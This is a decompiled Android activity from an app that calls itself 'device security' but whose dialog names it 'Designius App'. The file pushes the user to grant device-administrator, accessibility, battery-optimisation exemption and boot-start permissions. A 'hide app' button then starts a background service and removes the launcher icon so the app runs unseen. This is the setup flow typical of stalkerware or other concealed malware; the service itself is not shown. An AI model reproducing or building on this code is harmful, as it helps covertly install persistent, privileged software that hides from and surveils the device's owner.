package com.device.security.activities;

import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog.Builder;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import com.device.security.R;
import com.device.security.receiver.ActivateDeviceAdminReceiver;
import com.device.security.util.SharedPreferencesUtil;
import com.device.security.util.Util;

public class MainActivity extends AppCompatActivity {
    private static final int ADMIN_REQUEST_CODE_ = 1000;
    private static final int REQUEST_BATTERY_OPTIMIZATION = 101;
    private static final int REQUEST_PERMISSION = 100;
    private static final String TAG = MainActivity.class.getName();
    static String[] permissions = new String[]{"android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.RECEIVE_BOOT_COMPLETED"};
    @BindView(2131165223)
    Button accessibilityButton;
    @BindView(2131165267)
    Button deviceAdminButton;
    @BindView(2131165282)
    Button hideAppButton;
    @BindView(2131165292)
    ImageView imgAccessibilityPermission;
    @BindView(2131165293)
    ImageView imgDeviceAdmin;

    /* Access modifiers changed, original: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        if (VERSION.SDK_INT >= 23) {
            requestBatteryOptimization();
        }
    }

    private void requestBatteryOptimization() {
        try {
            String packageName = getPackageName();
            PowerManager powerManager = (PowerManager) getSystemService("power");
            if (powerManager == null || powerManager.isIgnoringBatteryOptimizations(packageName)) {
                requestRunTimePermissions();
                return;
            }
            Intent intent = new Intent();
            intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("package:");
            stringBuilder.append(packageName);
            intent.setData(Uri.parse(stringBuilder.toString()));
            startActivityForResult(intent, 101);
        } catch (Exception e) {
            e.getMessage();
        }
    }

    /* Access modifiers changed, original: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == ADMIN_REQUEST_CODE_ && i2 == -1) {
            this.imgDeviceAdmin.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
        } else if (i2 == 0 && i == 101) {
            requestBatteryOptimization();
        } else if (i2 == -1 && i == 101) {
            requestRunTimePermissions();
        }
    }

    /* Access modifiers changed, original: 0000 */
    @OnClick({2131165267})
    public void onDeviceAdminRequest() {
        if (Util.isEnabledAsDeviceAdministrator()) {
            Toast.makeText(getApplicationContext(), "Already Active as Device Admin", 1).show();
        } else {
            deviceAdministratorRequest();
        }
    }

    /* Access modifiers changed, original: protected */
    public void onResume() {
        super.onResume();
        if (Util.isAccessibilityEnabled(this)) {
            this.imgAccessibilityPermission.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
        }
        if (Util.isEnabledAsDeviceAdministrator()) {
            this.imgDeviceAdmin.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
        }
    }

    /* Access modifiers changed, original: 0000 */
    @OnClick({2131165223})
    public void onAccessibilityPermissionRequest() {
        if (Util.isAccessibilityEnabled(this)) {
            Toast.makeText(getApplicationContext(), "Permission Already Granted.", 1).show();
        } else {
            startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
        }
    }

    /* Access modifiers changed, original: 0000 */
    @OnClick({2131165282})
    public void onHideApp() {
        if (Util.isEnabledAsDeviceAdministrator() && Util.isAccessibilityEnabled(this)) {
            Util.startService(this);
            Util.hideAppIcon(this, getPackageName(), "com.device.security.activities.MainActivity");
            SharedPreferencesUtil.setAppAsHidden(this, true);
            finish();
            return;
        }
        Toast.makeText(this, "Please Grant All Permissions", 0).show();
    }

    private void deviceAdministratorRequest() {
        ComponentName componentName = new ComponentName(this, ActivateDeviceAdminReceiver.class);
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.action.SET_NEW_PASSWORD", componentName);
        intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
        startActivityForResult(intent, ADMIN_REQUEST_CODE_);
    }

    private void requestRunTimePermissions() {
        if (checkSelfPermission(permissions[0]) != 0 || checkSelfPermission(permissions[1]) != 0 || checkSelfPermission(permissions[2]) != 0) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[0]) || ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[1]) || ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[2])) {
                displayPermissionRequestDialog();
            } else {
                ActivityCompat.requestPermissions(this, permissions, 100);
            }
        }
    }

    public int checkSelfPermission(String str) {
        return ActivityCompat.checkSelfPermission(this, str);
    }

    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 100) {
            i = iArr.length;
            int i2 = 0;
            Object obj = null;
            while (i2 < i) {
                if (iArr[i2] != 0) {
                    obj = null;
                    break;
                } else {
                    i2++;
                    obj = 1;
                }
            }
            if (obj != null) {
                Log.d(TAG, "All Permissions Granted.");
            } else if (ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[0]) || ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[1]) || ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[2])) {
                displayPermissionRequestDialog();
            }
        }
    }

    private void displayPermissionRequestDialog() {
        Builder builder = new Builder(this);
        builder.setTitle("Need Permissions");
        builder.setMessage("Designius App need Multiple Permissions.\nPlease Grant.");
        builder.setPositiveButton("Grant", new OnClickListener() {
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.cancel();
                ActivityCompat.requestPermissions(MainActivity.this, MainActivity.permissions, 100);
            }
        });
        builder.setNegativeButton("Cancel", new OnClickListener() {
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.cancel();
            }
        });
        builder.setCancelable(false);
        builder.show();
    }
}
